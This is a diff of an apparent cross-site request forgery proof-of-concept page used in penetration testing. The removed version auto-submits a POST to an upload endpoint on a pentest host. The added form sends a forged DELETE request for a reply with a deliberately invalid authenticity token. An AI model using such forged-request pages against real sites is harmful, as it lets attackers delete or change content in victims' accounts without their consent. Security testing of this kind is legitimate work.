@@ -1,16 +1,9 @@
-<!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <title>CSRF PoC - Form</title>
-</head>
+<html>
 <body>
-  <form id="csrf" action="https://pentest.cdd.io:443/vaults/1050591758/active_storage_direct_uploads" method="POST">
-    <!-- No form-compatible parameters were detected. -->
-    <input type="submit" value="Submit request">
-  </form>
-  <script>
-    document.getElementById("csrf").submit();
-  </script>
+<form action="https://pentest.cdd.io/vaults/1050591758/replies/1041496659" method="POST">
+  <input type="hidden" name="_method" value="delete">
+  <input type="hidden" name="authenticity_token" value="not valid">
+  <button type="submit">Send Request</button>
+</form>
 </body>
 </html>
